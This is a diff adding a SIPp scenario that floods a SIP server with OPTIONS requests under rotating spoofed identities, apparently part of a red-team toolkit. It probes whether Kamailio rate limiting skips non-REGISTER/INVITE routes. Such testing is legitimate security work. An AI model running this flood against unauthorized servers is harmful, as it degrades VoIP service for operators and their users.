@@ -1,0 +1,49 @@
+<?xml version="1.0" encoding="ISO-8859-1" ?>
+<!DOCTYPE scenario SYSTEM "sipp.dtd">
+
+<!-- options_flood.xml
+     Single real source, rotating spoofed identity per request, same
+     shape as register_flood.xml but using OPTIONS instead of REGISTER.
+     OPTIONS never registers or establishes a dialog - it's a stateless
+     capability/keepalive query - which is exactly the point: many real
+     Kamailio configs wire pike/htable checks into the REGISTER and
+     INVITE routes specifically, not every route the request could take,
+     so OPTIONS (along with SUBSCRIBE/MESSAGE/PUBLISH) commonly passes
+     straight through unrated. This tests whether that gap exists. -->
+
+<!-- IMPORTANT: [call_id] must be used verbatim as the entire Call-ID
+     header value, unprefixed and unsuffixed. SIPp correlates responses
+     back to the open transaction using this value internally, not by
+     doing a literal string-compare against what it sent - a custom
+     prefix breaks that correlation and every response gets silently
+     discarded as "out of call", even a perfectly well-formed one.
+     Rotate identity via the From/Contact user-part instead. -->
+
+<scenario name="OPTIONS Flood - single source, rotating identity">
+
+  <send retrans="500">
+    <![CDATA[
+
+      OPTIONS sip:[remote_ip]:[remote_port] SIP/2.0
+      Via: SIP/2.0/[transport] [local_ip]:[local_port];branch=[branch]
+      From: <sip:floodtest[call_number]@[local_ip]>;tag=[call_number]
+      To: <sip:[remote_ip]:[remote_port]>
+      Call-ID: [call_id]
+      CSeq: 1 OPTIONS
+      Contact: <sip:floodtest[call_number]@[local_ip]:[local_port]>
+      Max-Forwards: 70
+      User-Agent: SIP-Redteam-Toolkit-OptionsFlood
+      Content-Length: 0
+
+    ]]>
+  </send>
+
+  <!-- SIPp requires exactly one MANDATORY recv per call - see
+       register_flood.xml for the full rationale. A silent drop (the
+       method-scope bypass being unprotected has no bearing here - a
+       drop would mean something else entirely is wrong) and a non-200
+       final response both surface as the same "not successful" signal. -->
+  <recv response="100" optional="true"></recv>
+  <recv response="200"></recv>
+
+</scenario>
